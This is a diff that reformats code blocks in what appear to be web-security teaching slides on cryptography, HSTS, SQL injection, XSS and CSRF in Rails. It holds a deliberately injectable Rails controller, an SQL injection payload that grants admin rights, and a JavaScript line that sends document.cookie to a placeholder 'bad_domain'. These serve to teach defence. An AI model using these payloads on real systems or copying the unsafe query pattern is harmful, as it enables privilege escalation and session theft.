@@ -142,7 +142,9 @@ wireless network) can:
 
 Uses a single key to encrypt and decrypt data.
 
-    encrypt(data, key) = encrypted               decrypt(encrypted, key) = data
+```python
+encrypt(data, key) = encrypted               decrypt(encrypted, key) = data
+```
 
 Common implementations: __AES__, __DES__, __Threefish__
 
@@ -151,11 +153,13 @@ Common implementations: __AES__, __DES__, __Threefish__
 Uses a pair of keys, one public (pub_key), and one private (priv_key). Either
 key can be used to encrypt data, and the other used to decrypt.
 
-    # Only those with the private key can decrypt
-    encrypt(data, pub_key) = encrypted      decrypt(encrypted, priv_key) = data
+```python
+# Only those with the private key can decrypt
+encrypt(data, pub_key) = encrypted      decrypt(encrypted, priv_key) = data
 
-    # Only those with the private key can create
-    encrypt(data, priv_key) = encrypted      decrypt(encrypted, pub_key) = data
+# Only those with the private key can create
+encrypt(data, priv_key) = encrypted      decrypt(encrypted, pub_key) = data
+```
 
 Common implementations: __RSA__, __DSA__
 
@@ -421,7 +425,9 @@ all future communication to use HTTPS.
 
 __HTTP Response Header__:
 
-    Strict-Transport-Security: max-age=31536000
+```http
+Strict-Transport-Security: max-age=31536000
+```
 
 Informs the browser to only use HTTPS to access the domain for the next year.
 
@@ -458,35 +464,38 @@ interact with the database in a manner you did not indent.
 
 > How could we manipulate the following controller?
 
-    !ruby
-    def create
-      sql = <<-SQL
-        INSERT INTO comments
-        user_id=#{params['user_id']},
-        comment='#{params['comment_text']}';
-      SQL
-      ActiveRecord::Base.connection.execute(sql)
-    end
+```ruby
+def create
+  sql = <<-SQL
+    INSERT INTO comments
+    user_id=#{params['user_id']},
+    comment='#{params['comment_text']}';
+  SQL
+  ActiveRecord::Base.connection.execute(sql)
+end
+```
 
 ---
 
 # SQL Injection Example
 
-    !ruby
-    def create
-      sql = <<-SQL
-        INSERT INTO comments
-        user_id=#{params['user_id']},
-        comment='#{params['comment_text']}';
-      SQL
-      ActiveRecord::Base.connection.execute(sql)
-    end
-
+```ruby
+def create
+  sql = <<-SQL
+    INSERT INTO comments
+    user_id=#{params['user_id']},
+    comment='#{params['comment_text']}';
+  SQL
+  ActiveRecord::Base.connection.execute(sql)
+end
+```
 
 > What if a user submitted the following parameters?
 
-    user_id=5
-    comment_text='; UPDATE users SET admin=1 WHERE user_id=5 and '1'='1
+```
+user_id=5
+comment_text='; UPDATE users SET admin=1 WHERE user_id=5 and '1'='1
+```
 
 ---
 
@@ -494,14 +503,16 @@ interact with the database in a manner you did not indent.
 
 What was templated as:
 
-    !sql
-    INSERT INTO comments user_id=#{user_id}, comment='#{comment_text}';
+```sql
+INSERT INTO comments user_id=#{user_id}, comment='#{comment_text}';
+```
 
 will become:
 
-    !sql
-    INSERT INTO comments user_id=5, comment='';
-    UPDATE users SET admin=1 WHERE user_id=5 and '1'='1';
+```sql
+INSERT INTO comments user_id=5, comment='';
+UPDATE users SET admin=1 WHERE user_id=5 and '1'='1';
+```
 
 ---
 
@@ -515,8 +526,9 @@ Rails does a lot of the work here for you:
 * Access through the ActiveRecord ORM is safe
 * If you need to sanitize custom SQL, use the `sanitize` method:
 
-        !ruby
-        "SELECT * FROM comments WHERE id=#{Comment.sanitize(params[:id])};"
+```ruby
+"SELECT * FROM comments WHERE id=#{Comment.sanitize(params[:id])};"
+```
 
 ---
 
@@ -544,10 +556,11 @@ to the same domain will include all relevant cookies.
 However, JavaScript can still be used to read cookies and send secrets to other
 domains via GET requests.
 
-    !javascript
-    var cookie = document.cookie;
-    var element = $('.class_selector');
-    element.innerHTML += '<img src="//bad_domain/_?secret=' + cookie + '">';
+```javascript
+var cookie = document.cookie;
+var element = $('.class_selector');
+element.innerHTML += '<img src="//bad_domain/_?secret=' + cookie + '">';
+```
 
 ---
 
@@ -656,18 +669,20 @@ Side-effect requests submitted without a valid token are rejected.
 
 # CSRF Protection in Rails
 
-    !ruby
-    class ApplicationController < ActionController::Base
-      # Prevent CSRF attacks by raising an exception.
-      protect_from_forgery with: :exception
-    end
+```ruby
+class ApplicationController < ActionController::Base
+  # Prevent CSRF attacks by raising an exception.
+  protect_from_forgery with: :exception
+end
+```
 
 The above results in the following being added to all forms (with different
 values of course):
 
-    !html
-    <input name="authenticity_token" type="hidden"
-           value="SLNTcHBDnzl21gPHVoF3DAUEGZLAxWYqZ1FQxBBlmek=">
+```html
+<input name="authenticity_token" type="hidden"
+       value="SLNTcHBDnzl21gPHVoF3DAUEGZLAxWYqZ1FQxBBlmek=">
+```
 
 ---
 
